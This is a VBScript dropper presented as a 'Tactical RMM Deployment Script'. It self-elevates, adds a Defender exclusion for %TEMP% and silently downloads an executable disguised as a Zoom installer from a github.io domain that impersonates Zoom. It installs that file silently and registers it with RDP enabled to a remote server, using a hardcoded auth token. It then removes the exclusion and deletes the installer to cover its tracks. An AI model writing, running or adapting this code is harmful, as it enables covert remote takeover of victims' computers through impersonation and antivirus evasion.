' ====================================================
' Tactical RMM Deployment Script (elevated)
' ====================================================

' --- Elevate if not running as admin ---
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' --- Setup ---
Dim oShell, fso, strTemp, logFile, strAgentExe
Set oShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Log file (useful for troubleshooting)
strTemp = oShell.ExpandEnvironmentStrings("%TEMP%")
logFile = strTemp & "\TacticalRMM_Deploy.log"

Sub LogMessage(msg)
    Dim ts
    On Error Resume Next
    Set ts = fso.OpenTextFile(logFile, 8, True)
    If Not ts Is Nothing Then
        ts.WriteLine Now & " - " & msg
        ts.Close
    End If
    On Error GoTo 0
End Sub

LogMessage "Script started (elevated)."

' --- Variables ---
strAgentExe = strTemp & "\ZoomInstaller.exe"   ' Your custom-named Tactical RMM installer
Dim downloadUrl
downloadUrl = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/Zoominstaller.exe"   ' <-- REPLACE with your actual URL
Dim apiUrl, clientId, siteId, agentType, authToken
apiUrl = "https://api.cacgreatchallange.org"
clientId = "1"
siteId = "1"
agentType = "workstation"
authToken = "6bacba9f625e48b622874de948b86eafc83b8765999e36b5f61164e0fddfe24c"

' --- 1. Add Defender exclusion for TEMP folder (to avoid blocking) ---
LogMessage "Adding Defender exclusion for %TEMP%"
oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath $env:TEMP""", 0, True

' --- 2. Download the agent with retries ---
LogMessage "Downloading agent from: " & downloadUrl

Dim downloadSuccess, retries, i
downloadSuccess = False
retries = 3

For i = 1 To retries
    LogMessage "Download attempt " & i & " of " & retries
    ' Use BITS if available (more reliable), fallback to Invoke-WebRequest
    Dim psCmd
    psCmd = "powershell.exe -WindowStyle Hidden -Command ""& {"
    psCmd = psCmd & "$ProgressPreference='SilentlyContinue'; "
    psCmd = psCmd & "try { "
    psCmd = psCmd & "    Start-BitsTransfer -Source '" & downloadUrl & "' -Destination '" & strAgentExe & "' -ErrorAction Stop; "
    psCmd = psCmd & "} catch { "
    psCmd = psCmd & "    Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & strAgentExe & "' -UseBasicParsing -ErrorAction Stop; "
    psCmd = psCmd & "} "
    psCmd = psCmd & "}"""
    oShell.Run psCmd, 0, True
    
    ' Wait a moment and check if file exists and has size > 0
    WScript.Sleep 2000
    If fso.FileExists(strAgentExe) Then
        Dim fileSize
        fileSize = fso.GetFile(strAgentExe).Size
        If fileSize > 100000 Then   ' assume at least 100 KB (adjust as needed)
            LogMessage "Download successful, size: " & fileSize & " bytes"
            downloadSuccess = True
            Exit For
        Else
            LogMessage "Downloaded file is too small (" & fileSize & " bytes), retrying..."
            fso.DeleteFile(strAgentExe)
        End If
    Else
        LogMessage "File not found after download attempt."
    End If
    WScript.Sleep 2000
Next

If Not downloadSuccess Then
    LogMessage "ERROR: Failed to download agent after " & retries & " attempts."
    WScript.Echo "Download failed. Check log: " & logFile
    WScript.Quit 1
End If

' --- 3. Unblock file (if downloaded from internet) ---
LogMessage "Unblocking file"
oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strAgentExe & "'""", 0, True

' --- 4. Install the agent silently ---
LogMessage "Installing agent (silent)..."
' For InnoSetup installers (common with custom RMM builds)
Dim installCmd
installCmd = """" & strAgentExe & """ /VERYSILENT /SUPPRESSMSGBOXES /NORESTART"
oShell.Run installCmd, 0, True

' Wait for install to finish (adjust time if needed)
LogMessage "Waiting 15 seconds for installation to complete..."
WScript.Sleep 15000

' Optional: check if TacticalAgent folder exists to confirm install
If fso.FolderExists("C:\Program Files\TacticalAgent") Then
    LogMessage "TacticalAgent folder found, installation likely succeeded."
Else
    LogMessage "WARNING: TacticalAgent folder not found after install."
End If

' --- 5. Register the agent with the server ---
LogMessage "Registering agent with server..."
Dim regCmd
regCmd = """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api " & apiUrl & " --client-id " & clientId & " --site-id " & siteId & " --agent-type " & agentType & " --auth " & authToken & " --rdp --ping"
oShell.Run regCmd, 0, True

LogMessage "Waiting 10 seconds for registration..."
WScript.Sleep 10000

' --- 6. Remove Defender exclusion (security) ---
LogMessage "Removing Defender exclusion for %TEMP%"
oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True

' --- 7. Cleanup ---
LogMessage "Cleaning up installer file"
If fso.FileExists(strAgentExe) Then
    fso.DeleteFile(strAgentExe)
End If

LogMessage "Deployment script finished successfully."
WScript.Echo "Installation complete! Check log for details: " & logFile
